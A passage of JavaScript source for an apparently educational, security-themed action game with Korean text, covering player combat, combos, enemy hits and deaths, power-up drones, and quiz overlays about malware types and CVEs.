  if (isDown('KeyD', 'ArrowRight')) dx += 1;
  if (isDown('KeyW', 'ArrowUp')) dy -= 1;
  if (isDown('KeyS', 'ArrowDown')) dy += 1;
  const l = Math.hypot(dx, dy);
  return l ? { x: dx / l, y: dy / l, on: true } : { x: 0, y: 0, on: false };
}
function nearestEnemy(x, y, maxD) {
  let best = null, bd = maxD * maxD;
  for (const e of game.enemies) { if (e.dead) continue; const d = (e.x - x) ** 2 + (e.y - y) ** 2; if (d < bd) { bd = d; best = e; } }
  return best;
}
function aimAtStart() {
  if (isFPS()) return; // 1인칭은 시선 방향 그대로 공격
  const d = inputDir();
  if (d.on) { player.facing = Math.atan2(d.y, d.x); return; }
  const n = nearestEnemy(player.x, player.y, 320);
  if (n) player.facing = Math.atan2(n.y - player.y, n.x - player.x);
}
function startAttack(def, kind, idx) {
  player.state = 'attack'; player.atk = applyWeapon({ ...def }, kind); player.atkKind = kind; player.t = 0;
  player.hitSet.clear(); player.tickT = 0; player.waveFired = false; player.pounded = false;
  aimAtStart();
  if (kind === 'L') { player.step = idx + 1; audio.swing(idx === 4); }
  else {
    audio.swing(true);
    floatText(player.x, player.y - 70, def.label, '#ffe082', 22, { life: 1, vy: -40, bold: true, important: true });
    if (def.kind === 'pound') { player.inv = Math.max(player.inv, 0.55); }
  }
}
function tryMusou() {
  if (player.musou < 100 || player.state === 'musou') return;
  player.musou = 0; player.z = 0; player.state = 'musou'; player.musouT = 0; player.musouDur = 3.2; player.musouTick = 0; player.inv = 4;
  audio.musou(); audio.intensity = 1;
  screenFlash('#ffb300', 0.6); addShake(12); game.zoomPunch = 0.12;
  banner(pick(CT.musouShouts), '무쌍 난무 — J 연타로 연장!', '#ffb300', 2.2, 58);
  ring(player.x, player.y, 20, 420, '#ffcc00', 0.5, 14);
}
function tryTyping() {
  if (player.term < 100 || game.typing || player.state === 'musou') return;
  player.term = 0;
  startTyping(pick(CT.commands), false);
}
function startTyping(c, mission) {
  game.typing = { cmd: c.cmd, desc: c.desc, tag: c.tag, idx: 0, t: 0, max: Math.max(8, c.cmd.length * 0.45 + (mission ? 6 : 2)), errors: 0, done: false, shakeT: 0, mission };
  audio.alarm();
  player.state = 'idle'; player.atk = null; player.z = 0;
}

function updatePlayer(dt) {
  const p = player;
  p.inv = Math.max(0, p.inv - dt); p.dashCd -= dt; p.hurtT -= dt;
  if (p.patchT > 0) p.patchT -= dt;
  if (p.quizBuffT > 0) p.quizBuffT -= dt;
  p.atkMul = (1 + (p.level - 1) * 0.08) * (p.patchT > 0 ? 1.5 : 1) * (p.quizBuffT > 0 ? 1.3 : 1) * (game.gijoT > 0 ? 2 : 1);
  const fps = isFPS();
  if (fps) {
    // ← → 방향키 회전 (마우스 없이도 플레이 가능)
    // 가감속이 있는 부드러운 회전
    const turn = (isDown('ArrowRight') ? 1 : 0) - (isDown('ArrowLeft') ? 1 : 0) + (touch.joy ? touch.jx : 0);
    const rdt = dt / (game.slowT > 0 ? 0.3 : 1);
    p.turnV = lerp(p.turnV || 0, turn * 3.0, Math.min(1, rdt * (turn ? 9 : 14)));
    p.facing += p.turnV * rdt;
  }
  const dir = inputDir();

  if (wasPressed('Space')) tryMusou();
  if (wasPressed('KeyE', 'KeyC')) tryTyping();

  // 대시 (공격 캔슬 가능)
  if (wasPressed('KeyL', 'ShiftLeft', 'ShiftRight') && p.dashCd <= 0 && p.state !== 'musou' && !(p.state === 'attack' && p.atk.kind === 'pound')) {
    const a = dir.on ? Math.atan2(dir.y, dir.x) : p.facing;
    p.state = 'dash'; p.dashT = 0.2; p.dashCd = 0.32; p.dashDx = Math.cos(a); p.dashDy = Math.sin(a); p.inv = Math.max(p.inv, 0.25);
    if (!fps) p.facing = a;
    audio.swing(false); dust(p.x, p.y + 15, 8);
  }

  switch (p.state) {
    case 'idle': case 'move': {
      if (dir.on) {
        if (!fps) p.facing = Math.atan2(dir.y, dir.x);
        const spd = 340 * (game.gijoT > 0 ? 1.3 : 1) * (game.mission && game.mission.carrying ? 0.8 : 1);
        p.x += dir.x * spd * dt; p.y += dir.y * spd * dt; p.walk += dt * 12; p.state = 'move';
      } else p.state = 'idle';
      if (wasPressed('KeyJ', 'KeyZ')) startAttack(LIGHT[0], 'L', 0);
      else if (wasPressed('KeyK', 'KeyX')) startAttack(CHARGE[0], 'C', 0);
      break;
    }
    case 'dash': {
      p.dashT -= dt;
      p.x += p.dashDx * 1000 * dt; p.y += p.dashDy * 1000 * dt;
      if (Math.random() < 0.6) particle({ type: 'ghost', x: p.x, y: p.y, life: 0.18, max: 0.18, flip: p.flip });
      if (p.dashT <= 0) { p.state = 'idle'; p.step = 0; }
      if (wasPressed('KeyJ', 'KeyZ')) startAttack(LIGHT[0], 'L', 0);
      else if (wasPressed('KeyK', 'KeyX')) startAttack(CHARGE[1], 'C', 1); // 대시 → 돌진기
      break;
    }
    case 'attack': updateAttack(dt, dir); break;
    case 'musou': updateMusou(dt, dir); break;
  }
  p.flip = Math.cos(p.facing) >= 0 ? 1 : -1;
  p.x = clamp(p.x, 30, WORLD.w - 30); p.y = clamp(p.y, 30, WORLD.h - 30);
}

function updateAttack(dt, dir) {
  const p = player, a = p.atk;
  p.t += dt;
  if (wasPressed('KeyJ', 'KeyZ') && p.t > a.dur * 0.25) p.queued = 'L';
  if (wasPressed('KeyK', 'KeyX')) {
    if (a.kind === 'tornado') { if (a.dur < 2.8) { a.dur += 0.13; a.a1 += 0.13; a.cancel += 0.13; } }
    else if (p.t > a.dur * 0.2) p.queued = 'C';
  }
  const fx = Math.cos(p.facing), fy = Math.sin(p.facing);
  const inActive = p.t >= a.a0 && p.t <= a.a1;

  // 이동 요소
  if (p.atkKind === 'L' && p.t < a.a1) {
    const tgt = nearestEnemy(p.x, p.y, 150);
    const far = !tgt || Math.hypot(tgt.x - p.x, tgt.y - p.y) > 60;
    if (far) { p.x += fx * a.lunge * dt * (1 - p.t / a.dur) * 1.6; p.y += fy * a.lunge * dt * (1 - p.t / a.dur) * 1.6; }
  }
  if (a.kind === 'dash' && inActive) { p.x += fx * a.speed * dt; p.y += fy * a.speed * dt; if (Math.random() < 0.7) particle({ type: 'ghost', x: p.x, y: p.y, life: 0.2, max: 0.2, flip: p.flip }); }
  if (a.kind === 'tornado') {
    if (dir.on) { p.x += dir.x * 200 * dt; p.y += dir.y * 200 * dt; }
    if (!isFPS()) p.facing += dt * 22;
  }
  if (a.kind === 'pound') p.z = p.t < a.a0 ? Math.sin((p.t / a.a0) * Math.PI * 0.5) * 90 * (1 - Math.max(0, (p.t - a.a0 * 0.7) / (a.a0 * 0.3))) : 0;

  // 타격 판정
  if (inActive) {
    if (a.tick) { p.tickT -= dt; if (p.tickT <= 0) { p.tickT = a.tick; p.hitSet.clear(); doAttackHits(a); } }
    else doAttackHits(a);
  }
  if (a.kind === 'wave' && !p.waveFired && p.t >= a.a0) {
    p.waveFired = true;
    for (const off of [-0.32, 0, 0.32]) {
      const ang = p.facing + off;
      game.waves.push({ x: p.x + Math.cos(ang) * 30, y: p.y + Math.sin(ang) * 30, vx: Math.cos(ang) * 980, vy: Math.sin(ang) * 980, r: 48, life: 0.55, dmg: a.dmg, kb: a.kb, ang, hit: new Set() });
    }
    addShake(a.shake); audio.boom(0.6);
  }
  if (a.kind === 'pound' && !p.pounded && p.t >= a.a0) {
    p.pounded = true; p.z = 0;
    addShake(a.shake); screenFlash('#ffffff', 0.45); game.zoomPunch = 0.1; audio.boom(1.4);
    ring(p.x, p.y, 20, a.range + 40, '#80d8ff', 0.45, 18); ring(p.x, p.y, 10, a.range * 0.6, '#fff', 0.3, 8);
    dust(p.x, p.y, 24); keycapBurst(p.x, p.y, 10);
    floatText(p.x, p.y - 90, 'ENTER!!', '#fff', 46, { life: 0.9, vy: -30, bold: true, important: true });
  }
  if (a.kind === 'radial' && p.t >= a.a0 && p.t - dt < a.a0) { ring(p.x, p.y, 10, a.range + 30, '#b388ff', 0.35, 12); addShake(a.shake); audio.boom(0.8); dust(p.x, p.y, 12); }

  // 콤보 연결
  if (p.t >= a.cancel && p.queued) {
    const q = p.queued; p.queued = null;
    if (q === 'L' && p.atkKind === 'L' && p.step < LIGHT.length) { startAttack(LIGHT[p.step], 'L', p.step); return; }
    if (q === 'L' && p.atkKind === 'C') { startAttack(LIGHT[0], 'L', 0); return; }
    if (q === 'C' && p.atkKind === 'L') { const ci = Math.min(p.step, CHARGE.length - 1); startAttack(CHARGE[ci], 'C', ci); return; }
    if (q === 'C' && p.atkKind === 'C') { startAttack(CHARGE[0], 'C', 0); return; }
  }
  if (p.t >= a.dur) { p.state = 'idle'; p.atk = null; p.step = 0; p.queued = null; p.z = 0; }
}

function doAttackHits(a) {
  const p = player;
  const heavy = player.atkKind === 'C' || a.heavyish || !!curWeapon().heavy;
  for (const e of game.enemies) {
    if (e.dead || p.hitSet.has(e)) continue;
    const dx = e.x - p.x, dy = e.y - p.y, d = Math.hypot(dx, dy);
    let hit = false;
    if (a.kind === 'arc') {
      if (d < a.range + e.r) {
        if (a.arc >= 360 || d < e.r + 10) hit = true;
        else hit = Math.abs(angDiff(Math.atan2(dy, dx), p.facing)) <= (a.arc * Math.PI / 180) / 2 + (e.r / Math.max(d, 1)) * 0.5;
      }
    } else if (a.kind === 'radial' || a.kind === 'pound' || a.kind === 'tornado' || a.kind === 'dash') hit = d < a.range + e.r;
    if (!hit) continue;
    p.hitSet.add(e);
    const nx = d ? dx / d : Math.cos(p.facing), ny = d ? dy / d : Math.sin(p.facing);
    let kx = nx, ky = ny;
    if (a.kind === 'tornado') { kx = nx * 0.6 - ny * 0.8; ky = ny * 0.6 + nx * 0.8; }
    if (a.kind === 'dash') { kx = Math.cos(p.facing) * 0.4 + nx * 0.6; ky = Math.sin(p.facing) * 0.4 + ny * 0.6; }
    hitEnemy(e, a.dmg, kx * a.kb, ky * a.kb, { heavy, launch: a.launch || (a.kind === 'tornado' ? 260 : 0), hs: a.hs, power: heavy ? 1.6 : 0.9 });
  }
  // 근접 공격으로 적 탄 상쇄 (패리)
  if (a.kind !== 'radial' || true) {
    for (const b of game.bullets) {
      const d = Math.hypot(b.x - p.x, b.y - p.y);
      if (b.friendly) continue;
      if (d < (a.range || 120) + 10) {
        if (curWeapon().reflect) { b.friendly = true; b.vx *= -1.6; b.vy *= -1.6; b.life = 1.5; b.color = '#69f0ae'; b.dmg *= 3; sparks(b.x, b.y, 8, '#69f0ae', 300); }
        else { b.life = 0; sparks(b.x, b.y, 5, '#80deea', 250); }
      }
    }
  }
  if (game.frameHits > 0) addShake(a.shake);
}

function updateMusou(dt) {
  const p = player;
  p.musouT += dt; p.musouTick -= dt;
  if (wasPressed('KeyJ', 'KeyZ', 'KeyK', 'KeyX') && p.musouDur < 4.8) { p.musouDur += 0.06; audio.clack(true); }
  const dir = inputDir();
  if (dir.on) { p.x += dir.x * 260 * dt; p.y += dir.y * 260 * dt; }
  if (!isFPS()) p.facing += dt * 14;
  if (p.musouTick <= 0 && p.musouT < p.musouDur) {
    p.musouTick = 0.065;
    const ang = Math.random() * TAU;
    particle({ type: 'slash', x: p.x, y: p.y, ang, r: rand(120, 200), life: 0.14, max: 0.14, color: Math.random() < 0.5 ? '#ffe082' : '#80d8ff' });
    for (const e of game.enemies) {
      const d = Math.hypot(e.x - p.x, e.y - p.y);
      if (d < 210 + e.r) {
        const nx = (e.x - p.x) / (d || 1), ny = (e.y - p.y) / (d || 1);
        hitEnemy(e, 13, nx * 260, ny * 260, { heavy: true, launch: 220, hs: 0.01, power: 1.1, noGauge: true });
      }
    }
    audio.swing(Math.random() < 0.3);
    if (Math.random() < 0.25) floatText(p.x + rand(-60, 60), p.y - 80, pick(CT.playerShouts), '#ffe082', 22, { life: 0.6, important: true, bold: true });
  }
  if (p.musouT >= p.musouDur) {
    // 피니시
    for (const e of game.enemies) {
      const d = Math.hypot(e.x - p.x, e.y - p.y);
      if (d < 440 + e.r) {
        const nx = (e.x - p.x) / (d || 1), ny = (e.y - p.y) / (d || 1);
        hitEnemy(e, 140, nx * 900, ny * 900, { heavy: true, launch: 1000, hs: 0, power: 3, noGauge: true });
      }
    }
    addHitstop(0.16); addShake(26); screenFlash('#fff', 0.85); game.slowT = 0.6; game.zoomPunch = 0.18;
    audio.boom(2); keycapBurst(p.x, p.y, 18);
    ring(p.x, p.y, 30, 480, '#ffcc00', 0.6, 22); ring(p.x, p.y, 10, 300, '#fff', 0.4, 10);
    floatText(p.x, p.y - 110, '배포 완료!!', '#ffcc00', 54, { life: 1.4, vy: -30, bold: true, important: true });
    p.state = 'idle'; p.inv = 0.6; audio.intensity = game.boss ? 1 : 0;
  }
}

// ───────────────────────── 타격 처리 ─────────────────────────
function hitEnemy(e, base, kbx, kby, o = {}) {
  if (e.dead) return;
  const p = player;
  let dmg = base * p.atkMul * rand(0.9, 1.1) * (e.groggyT > 0 ? 2 : 1);
  const crit = Math.random() < 0.12;
  if (crit) dmg *= 2;
  if (e.def.armor && !o.heavy) { dmg *= 1 - e.def.armor; sparks(e.x, e.y, 3, '#fff3a0', 200); }
  e.hp -= dmg; e.flash = 0.09;
  if ((e.type === 'officer' || e.type === 'boss') && !e.logAsked && e.hp > 0 && e.hp < e.maxhp * 0.5 && !game.overlay && !game.typing) { e.logAsked = true; if (canQuiz() && Math.random() < quizFreq().log) openLogQuiz(e); }
  const big = e.def.big;
  const kr = e.def.kbRes;
  e.kbx += kbx * kr; e.kby += kby * kr;
  if (big) { e.stun = Math.max(e.stun, 0.05); }
  else {
    e.stun = Math.max(e.stun, o.heavy ? 0.5 : 0.3); e.windup = 0;
    if (o.launch) e.vz = Math.max(e.vz, o.launch * rand(0.85, 1.1));
    else if (e.z > 0) e.vz = Math.max(e.vz, 300); // 공중 콤보(저글)
  }
  // 이펙트
  const ang = Math.atan2(kby, kbx);
  sparks(e.x, e.y - e.z, crit ? 10 : 6, crit ? '#fff176' : '#e1f5fe', o.heavy ? 560 : 420, ang, 1.6);
  if (o.power >= 1.5 && Math.random() < 0.25) keycapBurst(e.x, e.y - e.z, 1);
  if (o.heavy || crit) cubeBurst(e.x, e.y, e.z + e.r, big ? 3 : 1, e.type, 0.7, kbx, kby, 0.7); // 깎여나가는 조각
  floatText(e.x + rand(-10, 10), e.y - e.z - e.r - 6, (crit ? '' : '') + Math.round(dmg), crit ? '#ffeb3b' : '#ffffff', crit ? 24 : 16, { life: 0.6, vx: rand(-30, 30), bold: crit });
  if (crit && Math.random() < 0.5) floatText(e.x, e.y - e.z - e.r - 28, 'CRITICAL', '#ff9100', 14, { life: 0.5, bold: true });
  // 콤보 / 게이지
  game.combo++; game.comboT = 2.6; game.comboPop = 1;
  if (game.combo > game.maxCombo) game.maxCombo = game.combo;
  if (!o.noGauge) p.musou = Math.min(100, p.musou + 0.55 * (curWeapon().gauge || 1));
  game.frameHits++; game.framePow = Math.max(game.framePow, o.power || 1); game.frameHs = Math.max(game.frameHs, o.hs || 0);
  if (e.hp <= 0) killEnemy(e, kbx, kby, o);
}

function killEnemy(e, kbx = 0, kby = 0, o = {}) {
  if (e.dead) return;
  e.dead = true;
  game.ko++;
  player.term = Math.min(100, player.term + (e.def.big ? 25 : 1.6) * (curWeapon().gauge || 1));
  if (e.type === 'office') { game.stressBonus += 2; stats.officeKo++; store.set('stats', stats); floatText(e.x, e.y - 70, `“${(e.info && e.info.die) || '퇴근합니다'}”`, '#fff59d', 18, { life: 1.8, vy: -30, bold: true, important: true }); }
  if (game.mission && game.mission.stage >= 0 && MISSION.stages[game.mission.stage].action === 'kill' && missionKillTypes.has(e.type)) game.mission.prog++;
  game.stress = Math.min(100, (game.ko / game.diff.ko100) * 100 + game.stressBonus);
  const col = e.def.color;
  cubeBurst(e.x, e.y, e.z, e.type === 'boss' ? 90 : e.def.big ? 40 : e.type === 'bug' ? 7 : 11, e.type, e.def.big ? 1.6 : 1 + Math.min(1, Math.hypot(kbx, kby) / 600), kbx, kby, e.type === 'boss' ? 2.2 : e.def.big ? 1.5 : 1);
  binaryBurst(e.x, e.y - e.z, e.def.big ? 30 : 5, col);
  sparks(e.x, e.y - e.z, e.def.big ? 30 : 8, col, 380);
  audio.kill();
  // 날아가는 시체
  const sp = Math.hypot(kbx, kby) * (e.def.big ? 0.4 : 1.6) + 200;
  const a = Math.atan2(kby, kbx) || Math.random() * TAU;
  if (game.corpses.length < 120) game.corpses.push({ type: e.type, x: e.x, y: e.y, z: e.z, vx: Math.cos(a) * sp, vy: Math.sin(a) * sp, vz: rand(200, 500) + (o.launch || 0) * 0.3, rot: 0, vr: rand(-18, 18), life: 0.55, max: 0.55, r: e.r });
  const quips = CT.enemyQuips[e.type];
  if (quips && Math.random() < 0.07) floatText(e.x, e.y - e.r - 30, pick(quips), '#ffccbc', 15, { life: 1.1, vy: -40 });
  // 아이템
  const r = Math.random();
  if (e.def.big) {
    dropItem('coffee', e.x - 20, e.y); dropItem('energy', e.x + 20, e.y); if (Math.random() < 0.5) dropItem('patch', e.x, e.y + 20);
    if (Math.random() < (e.type === 'officer' ? 0.45 : e.type === 'keeper' ? 0.3 : 0)) dropGijo(e.x, e.y - 40);
  }
  else if (r < 0.0008) dropGijo(e.x, e.y);
  else if (r < 0.012) dropItem('coffee', e.x, e.y);
  else if (r < 0.02) dropItem('energy', e.x, e.y);
  else if (r < 0.025) dropItem('patch', e.x, e.y);
  // 바이러스 자가복제
  if (e.def.split && Math.random() < e.def.split && enemyCount() < 380) {
    for (let i = 0; i < 2; i++) { const c = makeEnemy('bug', e.x + rand(-20, 20), e.y + rand(-20, 20)); c.stun = 0.4; c.kbx = rand(-200, 200); c.kby = rand(-200, 200); }
    floatText(e.x, e.y - 30, '자가복제!', '#ff80ab', 14, { life: 0.7 });
  }
  // 레벨업 (권한 상승)
  const lv = 1 + Math.floor(game.ko / 150);
  if (lv > player.level) {
    player.level = lv; player.maxhp = Math.round(game.diff.hp * (1 + (lv - 1) * 0.05)); player.hp = Math.min(player.maxhp, player.hp + player.maxhp * 0.15);
    audio.levelup(); floatText(player.x, player.y - 100, `권한 상승! Lv.${lv}`, '#69f0ae', 26, { life: 1.4, vy: -40, bold: true, important: true });
    ring(player.x, player.y, 20, 120, '#69f0ae', 0.5, 6);
  }
  // KO 마일스톤
  if (game.ko >= game.nextKoMs) {
    banner(`${fmt(game.nextKoMs)} KO!!`, game.nextKoMs >= 1000 ? '일기당천!!' : '위협 대량 제거', '#ffd740', 1.6, 72);
    game.nextKoMs = game.nextKoMs < 500 ? game.nextKoMs + 100 : game.nextKoMs < 1000 ? game.nextKoMs + 250 : game.nextKoMs + 500;
  }
  if (!game.stressDone && game.stress >= 100) {
    game.stressDone = true;
    banner('스트레스 100% 해소!!', '여기서부터는 순수한 보너스 타임', '#69f0ae', 3, 64);
  }
  // 위협 인텔: 유형별 첫 처치 시 짧은 학습 카드 (전투는 계속)
  const mi = MALWARE_INFO[e.type];
  if (mi && !game.seenTypes[e.type]) {
    game.seenTypes[e.type] = true;
    const id = 'mal:' + e.type, first = !codexSeen[id];
    codexSeen[id] = true; store.set('codex', codexSeen);
    if (!game.learned.some((x) => x.id === id)) game.learned.push({ kind: 'malware', id, data: mi });
    if (!game.cardToast || game.cardToast.t > 2.5) game.cardToast = { entry: { kind: 'malware', id, data: mi }, t: 0, dur: 6.5, first };
  }
  if (e.type === 'keeper') onKeeperDown(e);
  else if (e.type === 'officer') onOfficerDown(e);
  else if (e.type === 'boss') onBossDown(e);
}

function dropItem(kind, x, y) { game.items.push({ kind, x, y, t: 0, bob: Math.random() * 6 }); }
const itemLife = (it) => (it.kind === 'backup' ? 1e9 : it.kind === 'gijo' || it.kind === 'inspect' ? 40 : 22);

// ───────────────────────── GIJO 특별 아이템 ─────────────────────────
// 획득 시 15초간 "GIJO ASTER 가동": AI 보안관제 드론 3기 자동 요격 + 공격력 2배 + 무적 + 이속 30%↑ + 무쌍·HP 풀충전
const GIJO_DUR = 15;
function dropGijo(x, y, airdrop) {
  if (game.items.some((it) => it.kind === 'gijo')) return;
  dropItem('gijo', x, y);
  ring(x, y, 10, 160, '#ffd740', 0.7, 10);
  if (airdrop) { msg('[GIJO] 특별 지원 패키지가 투하되었습니다! (미니맵 금색 ◆)', '#ffd740'); audio.alarm(); }
  else floatText(x, y - 60, 'GIJO 드롭!!', '#ffd740', 26, { life: 1.4, bold: true, important: true });
}
function activateGijo() {
  const p = player;
  game.gijoT = GIJO_DUR; game.gijoUsed = true;
  p.hp = p.maxhp; p.musou = 100;
  game.drones = [0, 1, 2].map((i) => ({ i, cd: i * 0.08, x: p.x, y: p.y }));
  audio.capture(); audio.musou(); addShake(14); screenFlash('#ffd740', 0.7); game.slowT = 0.5; game.zoomPunch = 0.12;
  ring(p.x, p.y, 20, 360, '#ffd740', 0.7, 18); keycapBurst(p.x, p.y, 12);
  banner('GIJO ASTER 가동!!', 'AI 보안관제 드론 3기 자동 요격 · 공격력 2배 · 무적 15초', '#ffd740', 3, 72);
  msg('[GIJO] AI 보안관제 모드 활성화 — 드론이 위협을 자동 요격합니다', '#ffd740');
}
function updateGijo(dt) {
  // 주기적 공중 투하
  game.gijoSpawnT -= dt;
  if (game.gijoSpawnT <= 0) {
    game.gijoSpawnT = 120;
    const a = Math.random() * TAU;
    dropGijo(clamp(player.x + Math.cos(a) * 420, 80, WORLD.w - 80), clamp(player.y + Math.sin(a) * 420, 80, WORLD.h - 80), true);
  }
  if (game.gijoT <= 0) { game.drones.length = 0; return; }
  game.gijoT -= dt;
  if (game.gijoT <= 0) { msg('[GIJO] AI 보안관제 모드 종료', '#bcaaa4'); game.drones.length = 0; return; }
  const T = game.titleT;
  for (const d of game.drones) {
    const a = T * 3.2 + d.i * TAU / 3;
    d.x = player.x + Math.cos(a) * 78; d.y = player.y + Math.sin(a) * 78;
    d.cd -= dt;
    if (d.cd <= 0) {
      const tgt = nearestEnemy(d.x, d.y, 420);
      if (tgt) {
        d.cd = 0.22;
        game.bolts.push({ x1: d.x, y1: d.y, z1: 50, x2: tgt.x, y2: tgt.y, z2: tgt.z, life: 0.12, seed: Math.random(), gold: true });
        hitEnemy(tgt, 42, rand(-200, 200), rand(-200, 200), { heavy: true, launch: 380, power: 0.8, noGauge: true });
      }
    }
  }
}

function damagePlayer(dmg, srcX, srcY) {
  const p = player;
  if (p.inv > 0 || game.gijoT > 0 || game.state !== 'play') return;
  let d = dmg * game.diff.edmg;
  const w = curWeapon();
  if (w.guard && srcX !== undefined && Math.abs(angDiff(Math.atan2(srcY - p.y, srcX - p.x), p.facing)) < 1.2) { d *= 1 - w.guard; sparks(p.x + Math.cos(p.facing) * 30, p.y + Math.sin(p.facing) * 30, 6, '#69f0ae', 260); }
  p.hp -= d; p.inv = 0.45; p.hurtT = 0.25;
  p.musou = Math.min(100, p.musou + 2);
  game.combo = Math.max(0, Math.floor(game.combo * 0.5));
  audio.hurt(); addShake(6); screenFlash('#ff1744', 0.25); game.vignette = 0.6;
  floatText(p.x, p.y - 60, '-' + Math.round(d), '#ff5252', 22, { life: 0.8, bold: true, important: true });
  if (srcX !== undefined) { const a = Math.atan2(p.y - srcY, p.x - srcX); p.x += Math.cos(a) * 18; p.y += Math.sin(a) * 18; }
  if (p.hp <= 0) { p.hp = 0; endGame(false); }
}

// ───────────────────────── 학습: 거점·CVE 격파 ─────────────────────────
function onKeeperDown(e) {
  const b = e.base; if (!b) return;
  b.owner = 'ally'; b.keeper = null;
  audio.capture(); addHitstop(0.12); game.slowT = 0.8; screenFlash('#00e5ff', 0.4); addShake(14);
  ring(b.x, b.y, 30, b.r + 120, '#00e5ff', 0.7, 16);
  banner(`${b.info.base} 탈환!`, `${b.info.keeper} 격파 · ${b.info.owasp}`, '#00e5ff', 2.6);
  msg(`[관제] ${b.info.base} 거점 제압 완료 (${countAlly()}/${game.bases.length})`, '#4dd0e1');
  // 거점 내 잡몹 일소
  for (const o of game.enemies) if (!o.def.big && Math.hypot(o.x - b.x, o.y - b.y) < b.r + 120) { const a = Math.atan2(o.y - b.y, o.x - b.x); hitEnemy(o, 999, Math.cos(a) * 700, Math.sin(a) * 700, { heavy: true, launch: 800, power: 0.5, noGauge: true }); }
  learn({ kind: 'base', id: 'base:' + b.info.id, data: b.info });
  checkAllCaptured();
}
function onOfficerDown(e) {
  audio.capture(); addHitstop(0.14); game.slowT = 0.9; screenFlash('#ff1744', 0.4); addShake(16);
  ring(e.x, e.y, 30, 300, '#ff1744', 0.6, 14);
  if (e.missionBoss || !e.info) { banner(`${e.name} 격파!`, '암호화 중단 — 검증된 백업으로 복구 개시', '#ff8a80', 2.4); return; }
  banner(`${e.name} 격파!`, `${e.info.cve} 패치 완료`, '#ff8a80', 2.4);
  msg(`[관제] 적장 ${e.name}(${e.info.cve}) 무력화`, '#ff8a80');
  if (e.daily) { game.dailyDone = true; player.patchT = 20; msg('[오늘의 CVE] 격파 보너스: 보안패치 20초', '#ffd740'); }
  learn({ kind: 'cve', id: 'cve:' + e.info.cve, data: e.info });
}
function learn(entry) {
  const first = !codexSeen[entry.id];
  codexSeen[entry.id] = true; store.set('codex', codexSeen);
  if (!game.learned.some((x) => x.id === entry.id)) game.learned.push(entry);
  checkUnlocks();
  if (entry.data.quiz && canQuiz() && (first || Math.random() < quizFreq().review)) openQuiz({ kind: 'card', entry, quiz: entry.data.quiz, qid: entry.id, first, onResult: quizReward });
  else game.cardToast = { entry, t: 0, dur: 7 };
}
// ── 공용 퀴즈 오버레이 (도감 카드 · 로그 분석 · 보안 점검) ──
function shuffleQuiz(q) {
  const order = q.choices.map((_, i) => i).sort(() => Math.random() - 0.5);
  return { ...q, choices: order.map((i) => q.choices[i]), answer: order.indexOf(q.answer) };
}
// 퀴즈 빈도: '적당히'(기본) · '자주' · OFF — 전투 흐름을 끊지 않도록 전역 쿨다운
const QUIZ_FREQ = { normal: { label: '적당히', cd: 90, review: 0, log: 0.5, inspect: 150 }, often: { label: '자주', cd: 30, review: 0.5, log: 0.9, inspect: 75 } };
const quizFreq = () => QUIZ_FREQ[settings.quizFreq] || QUIZ_FREQ.normal;
const canQuiz = () => settings.quiz && game.time - (game.lastQuizAt ?? -999) >= quizFreq().cd;
function openQuiz(o) {
  game.lastQuizAt = game.time;
  game.overlay = { phase: 'quiz', picked: -1, t: 0, ...o, quiz: shuffleQuiz(o.quiz) };
  pressed = {};
}
function quizReward(ok) {
  if (!ok) return;
  player.quizBuffT = 30; player.musou = Math.min(100, player.musou + 50);
  player.hp = Math.min(player.maxhp, player.hp + player.maxhp * 0.2);
}
// 오답노트: 틀린 문제는 다음에 더 자주 (간격 반복)
const wrongNote = store.get('wrong', {}); // qid -> { q, a, n }
function noteAnswer(qid, quiz, ok) {
  if (!qid) return;
  if (ok) { if (wrongNote[qid]) { wrongNote[qid].n--; if (wrongNote[qid].n <= 0) delete wrongNote[qid]; } }
  else {
    wrongNote[qid] = { q: quiz.q, a: quiz.choices[quiz.answer], n: Math.min(5, ((wrongNote[qid] && wrongNote[qid].n) || 0) + 2) };
    if (!game.wrongToday.some((w) => w.qid === qid)) game.wrongToday.push({ qid, q: quiz.q, a: quiz.choices[quiz.answer], explain: quiz.explain });
  }
  store.set('wrong', wrongNote);
}
function pickWeighted(items, idOf) {
  // 학습 난이도 우선 + 오답 가중치
  const lv = settings.level || 1;
  let pool = items.filter((x) => (x.level || 1) === lv);
  if (pool.length < 4) pool = items;
  const recent = game.askedIds || (game.askedIds = new Set());
  const w = pool.map((x) => { const id = idOf(x); return (recent.has(id) ? 0.15 : 1) * (1 + 3 * ((wrongNote[id] && wrongNote[id].n) || 0)); });
  let r = Math.random() * w.reduce((a, b) => a + b, 0);
  for (let i = 0; i < pool.length; i++) { r -= w[i]; if (r <= 0) { recent.add(idOf(pool[i])); return pool[i]; } }
  return pool[0];
}
function answerQuiz(i) {
  const ov = game.overlay; if (!ov || ov.phase !== 'quiz') return;
  const q = ov.quiz;
  if (i < 0 || i >= q.choices.length) return;
  ov.picked = i; ov.phase = 'answer'; ov.t = 0;
  game.quizTotal++;
  const ok = i === q.answer;
  if (ok) { game.quizRight++; stats.quizRight++; store.set('stats', stats); audio.correct(); } else audio.wrong();
  noteAnswer(ov.qid, q, ok);
  if (ov.onResult) ov.onResult(ok);
  checkAchievements();
}
function checkAllCaptured() {
  if (game.bases.some((b) => b.owner === 'enemy')) return;
  if (game.diff.endless) {
    game.loopT = 18;
    banner('모든 거점 확보!', '18초 후 새로운 CVE가 공개됩니다…', '#69f0ae', 3);
  } else if (!game.boss) {
    game.bossSpawnT = 1.5;
    banner('모든 거점 확보!', 'C&C 서버에서 거대한 반응이 감지됩니다…', '#69f0ae', 3);
  }
}
function spawnBoss() {
  const b = makeEnemy('boss', HQ.x, HQ.y - 200);
  b.hp = b.maxhp = ETYPES.boss.hp * game.diff.ehp;
  b.name = '제로데이'; b.title = 'C&C 총사령관 · 패치 없음'; b.phase = 1; b.pat = 0; b.patT = 2.5;
  game.boss = b;
  audio.alarm(); audio.intensity = 1; addShake(20); screenFlash('#ff0040', 0.5);
  banner('⚠ 제로데이 출현 ⚠', (CT.boss && CT.boss.enter) || '아직 패치가 존재하지 않는 취약점. 직접 막아라!', '#ff1744', 3.5, 70);
  msg('[긴급] C&C 서버에서 제로데이 공격 개시!', '#ff5252');
}
function onBossDown() {
  addHitstop(0.2); game.slowT = 2.2; screenFlash('#fff', 1); addShake(28); audio.boom(2.5);
  for (const o of game.enemies) if (!o.dead && o.type !== 'boss') { const a = Math.random() * TAU; hitEnemy(o, 99999, Math.cos(a) * 900, Math.sin(a) * 900, { heavy: true, launch: 1000, noGauge: true }); }
  banner('제로데이 격파!!!', '긴급 패치 배포 완료 — 퇴근이다!', '#ffd740', 4, 76);
